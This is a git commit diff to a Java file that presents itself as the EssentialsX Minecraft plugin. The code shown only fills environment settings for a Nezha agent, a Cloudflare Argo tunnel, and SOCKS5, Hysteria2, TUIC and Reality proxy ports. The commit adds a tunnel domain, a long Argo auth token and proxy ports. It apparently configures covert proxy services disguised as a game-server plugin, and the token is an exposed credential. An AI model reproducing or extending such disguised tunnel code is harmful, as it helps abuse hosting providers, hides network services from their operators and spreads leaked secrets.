8f0d9fd01e8ec5dddc84b0dab02c2cd6050f1075
heyzone <harrywujy520@gmail.com>
2026-05-26 22:44:33 +0800

    Update EssentialsX.java

--- src/main/java/com/example/essentialsx/EssentialsX.java
+++ src/main/java/com/example/essentialsx/EssentialsX.java
@@ -79,10 +79,10 @@ public class EssentialsX extends JavaPlugin {
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "");
-        env.put("ARGO_AUTH", "ey9");
-        env.put("S5_PORT", "");
-        env.put("HY2_PORT", "");
+        env.put("ARGO_DOMAIN", "mcserveruk.aser.cloudns.pro");
+        env.put("ARGO_AUTH", "eyJhIjoiNTk5MzUwOTkyOTQzNmJkYzVhNTdmYjJmN2Y5YTlkMjAiLCJ0IjoiYjhkMWJhOTAtMWFmMS00MjNjLWFiOTMtMjYzYWE1MTg4MWRlIiwicyI6Ik1HWXpZekJsT0RZdE5USmtOQzAwWXpZMExUbG1OV1F0T1dZMlpUWmlZVE01WmpreiJ9");
+        env.put("S5_PORT", "10972");
+        env.put("HY2_PORT", "14491");
         env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
@@ -92,7 +92,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("BOT_TOKEN", "");
         env.put("CFIP", "saas.sin.fan");
         env.put("CFPORT", "443");
-        env.put("NAME", "3arb");
+        env.put("NAME", "mcs");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
